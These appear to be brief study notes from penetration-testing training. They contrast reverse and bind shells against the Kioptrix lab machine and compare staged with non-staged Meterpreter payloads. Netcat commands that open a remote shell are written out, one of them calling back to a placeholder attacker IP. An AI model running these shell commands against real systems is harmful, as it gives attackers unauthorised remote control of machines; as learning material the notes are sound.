Reverse shell = victim Kioptrix (nc *our_IP* 80 -e /bin/bash) connects to us (server listening) running netcat (nc -nlvp 80) = 95%

Bind shell = we (nc IP_victim 80) connect to victim (server running nc -lvp 80 -e /bin/sh) = 5%

server first
bash commands in attacker
(both TCP connection)

Exploits: non-staged (_ underline) sends exploit shellcode at once (larger, may not work windows/meterpreter_reverse_tcp) | staged (stage 1 / stage 2) in stages (less stable windows/meterpreter/reverse_tcp)
